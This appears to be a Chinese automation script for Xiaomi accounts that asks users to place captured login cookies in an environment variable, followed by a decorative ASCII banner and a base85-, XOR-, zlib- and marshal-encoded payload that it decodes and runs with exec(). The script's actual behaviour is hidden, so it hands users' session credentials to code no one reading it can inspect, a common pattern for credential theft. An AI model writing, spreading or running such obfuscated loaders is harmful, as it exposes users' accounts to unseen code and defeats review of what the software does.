# 大大鸣版 小米
# 有问题请及时联系大大鸣 v:xolag29638099  （有其他想要的脚本也可以联系，尽量试着写一写）
# 环境变量 yymxm 抓取 ck
# 多账号 使用#   例如：账号1#账号2
#
#
#   --------------------------------祈求区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
#
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   --------------------------------代码区--------------------------------
# -*- coding: utf-8 -*-
import zlib,base64,marshal,hashlib

def xor_decrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    return bytes(a ^ key_bytes[i % len(key_bytes)] for i, a in enumerate(data))

def decrypt():
    data = 'JM6R#JpeD3WQ~j<9Q|PNpdg=u%ceba=^WR2-XL<$@;|-P#en3fLD;WRQeFLp-4roFEY*ec=^&f_6Lzy?Dk|cfFKD@%A(Srx-ZrXuls?titj4uM2r0GYO31t^v7H`GQnF<YOS%;$*5@nOU!m{0?Zo7kVicr)ytb`4pe_$g^<gfy5k4wv=l}bTz#Gt{>j9MihT=W@cCb~sY8Avn0si&Tmlu;se-eYz(lDq1wjd0B8)4ez#Yi*4<3l+Yo+u@U0ZJB{=f610AG;x3zs?KZKVr|SLW_z|l~CVP_DO(9*;YJ(-)H3j$e8!Tr_LMkLR-Rh+VuXY)wU7?h{E#D66k0*<oY4(yyPc;I{ia_R+kXrja|kdh|Da^^kHL5lM;3JM1Nb=Y?<YIngdnznME{_;HGskG*(KEvs<HKydCFsw#Cj56ElgX^~2#ctvuW2xn30G9il#DS?FRehLkSy(3RVmLpTrK3Bs_Mmfx)21L9r6o1Lswin$N(?5yW_`K?XxVP<k2CBRxvJ1xpy8w+s4ss^<dl%v_$qKwB%#Gv$qmDLH~&1N=D$q_fS_UT@bz;Wx5e5Z!|DGTK7W7co7yYqEDbBq#~@>VpcUH!46yo#89e-AAP4XFUJ`!p%fyqdUO`IvP<Q-WZ`CqrT4iQzwtG4r|t<<l|Yn)VFOO&>_Rg`D9$frQSXydu?J+)GHOkPpzRQU*OdZ1JUMJ9CI=d%y#dfWvl!iu~=K3{59T!d;`a58bF*X-On!SV@sO^u(!JeTS(^U?nF8Rf9O8%EV{=5M?E=L^)Q5!jKtfH!R2a>d}O)^PWfYlM2z~iFule?6r^MmF<hHG}pc62??dMy<!sxn>aCY!!b09aEf>)p+#fBkE;n(uvdQnu=!t=Y!%8vn1ipW%Cie)i2vP|hqz~tL1;|V0}J_mpZ0GY`?`bA&JI1QZ?szHKTep>a4afG1`f_hZmuYh$!spJZoVx29XLR)aqk2(WD*2#|J;X-R(Y`Mw>ft>P6#-a3t&WF=DC(&UfUDO{<zqObukE7S<N8#(vm&=p{73}%iW&NCD3G6bIZT}4$mKKbN<vnFh-6VZYa%&(3iz292cr!hGTQ<oBIPt2+_fMjZKr(J$_g#II^Ast+bnrSMH)hh)L6;bMb%0q)%6%g@&(&fqd4&TMJ>Ff$MF(vAfxjJ}BxFSLiUKt4{I^Sl&c*L9YjMY<^d23<haS87u?$TkT(XZzu@o+DkFe%E(IxT827NrP{Os2>tjPd5n8;>Rf;+h^5_8N}5VjX+}J#@F^9p>-zHSVI0#94?GSw88ibVMsKN(t~AHuH22=Rc%3oRh&LW4Yykcr{QDdo(y3PcIjWQXZg!EAz3X7*Ac$<m6PIxobEGQ*+><-t+mUPM>q0{ZGxdS-=Nlp6_V!GgAx!<kzqkOS++|g&-KK|k5tZeY4TbG_E6CPn6&!gnEz5}BU!d}nrtY&9_nIg3l!FbI6sA;h8N5AemPC+F_L;trxjCW);RGhAX;3?Nbp43PNGZt!F6*Q0m)&zOOn(3nRAXEq^o#AAEe9m4Ye#|ecr@F^0Pwp#_>x&r5z}ftAby%FV!*g<!qRybfa{Oo!16@4k2F?mvW|(H^!VbZH2!6x?>`&B@ip2!_@^ey-T)*t#nj_!@QFz95@%EEQtl^X==BDU_`OFEixK^I_IY%G-~Ty_LuKjOYaRnN>bUwDzte<&silZ)N6TZy7R|f@Eo(CUY69(rPPS=PDY$Ff!#D*4x&gc?cq+FnDJM*ZlFlNE-}9;$#BUpw*p#LpyHEY3@q;nlFKn=a+juU$+&8HJiCOHE#eee9J&Sp4Y(~FSh>%w9R5<@QkC-!ocU;smCy76Q97x4OcukQV4R;}n%TnnLCOA9&lL5`tuD*RVcLaXuTKz2}BA^HKsIN&>vkOv8sB|Kul=lY~uKWX$g9ies`ub5XH@?}m-Z>FTXwNN_MyrbnCmN_==(!r1&Frn`WDcv2qxO_b)11ugvpgfQreOSX$QkA{`LwIX6VSk_Y*{q^Xm+CD>Kh%5nqz<g)VTrzBLp;dMQvVWf{f;m^F+oAGJ(Lvl|@F01E#n7ExDfHwCNAiYd<2`7ss<#TKPlVh7hNcEkpt&Ozu|GtbV7(!!vp#F&8=^F7Fd@5J>+f4izJd3thr>smn>Beqm1QGh)MPOEEOrW8yO5!09N>?13llH>bfC??J~paGD!3u8@uUs!E_5^%;67$<0F_S&sX;vr8G`w`L!71gaNADR_eDA^!#i@~}-h`)EVlD*O<2V&(WNH)m|rn>u}nvMkCJs1HZxCG-ioAOt!TE1<XX<Ifc5_EXm7<{BS!-Sp<R1C{@Gzmh$?f>`2PfC)|ea!>S@ONV&~3uoJU5JYenI*gjY?fXvC8c5%?`0c_Dnp^%k9t4^*FsnMD<8F)ZA*d|!C$k%se>HiO4)-p{^bELeoQADIqqI*~GGxgM75W59U~{SimX{<7;#$$O`O==-YKP`ml%i`f935W^yf_mCeYv^!8Z?p+qB-ddyapB5=9h<t?)QvPSvU41a!9AhBQ^?b07C*IN=*e`kmjko?++)jg#YlK4Sx`SjRVx!F58dZ>4@Nk7bR93Oy_Z2*cqkK`b;dOq^aG|p!&i*9vAEx`AOekV&^&KKXguaWCIfHo7)OrppJhOAktDaHlkU7r&mRr3>!fbsCel!O`9CUF~M1YnB%Df;jzj2V9ZW>mhzK2A>eeJg*M~F2h!=g=-k(@{sU@jou`00eE=w8%_L43tSdWJWkAgl_7`4KNwcqIgK*cX5$R?B8Cm}Lp-?2W8)$|@=0_j7gssWM^2aOv>x`}Wg@`5%Cg;kFP$Qn_i0WUNpZ^NI`$ECTM6Og@G-G}ntB~@IXN;7kC^pYR3yVGrF{;SSRWr}u694Q%6m!)ecr+p2)2g>i-<Wt+9(f=u{@Rb|r1?_=+b|NeGCq7GXD-hfeI=!C;cywk{gM$havP&;G^}rLI6|JvGl&)&r4>{H+X>tcdUt*4<na*{Nq$wvU>2q)KB5uQM_nc3F#bp0D>Px1PZUS%<gF1jb{ivXH2f%VUlU_F5;L$VEgo);iyVkcz_bUq$(hLO1-4|_6WU<Na+FCJLXuF0w$xQ|7n_+{&#wbWpMHHF)(W(_h9TRugSiJ-a~p!bqeB_0?erniX)2VK#oq$e5)0Nd?nwzaxucFf8Sf1|hc2L)ig}7G-U~UUE1|AY9ak8^T?W{bWv156w@{k2O%I`0_s|$)PJyuxemc~#0B-&SY3+Tp{lE{jSJh)lm0ZDT77RBQB%;AGRb~v5<<cuJ2Ws+9)7F6pdOKu1lFKjyM5<aY<-BNx12F7z&1Bwg23_sND}i5YYc2#YuY0#i7h!!0!B0TVX7P_(aSdLIycF>`GOG~kXfhgJu3q-2<ojDPHqST{Y;tund}*2z!!*;N!k*V)@cX){+rZym!M}8YCP=TrGHVz0d*s86mVDw6+xT1DIXi<u%dpfdYubkZgeMWvSuTrfHhm(~xJ8F=SQCpl5)QD5`an+t4jo7V?!1UUO*yY5UbW)|0M*SuLVre(eFHw!Y9jo@nD-GXZ}~6i&)xOPp#CQ+n>ufo7>}=j6up@P)UQTdqA>~'
    key = 'C6yZVP4AqSYS9yP7fVsB179em8IOpQrM'
    checksum = '09247cacb6ab123e'
    
    # Verify checksum
    if hashlib.sha256(data.encode()).hexdigest()[:16] != checksum:
        raise ValueError('Data integrity check failed')
        
    # Decrypt process
    encrypted = base64.b85decode(data)
    compressed = xor_decrypt(encrypted, key)
    marshalled = zlib.decompress(compressed)
    return marshal.loads(marshalled)

exec(decrypt())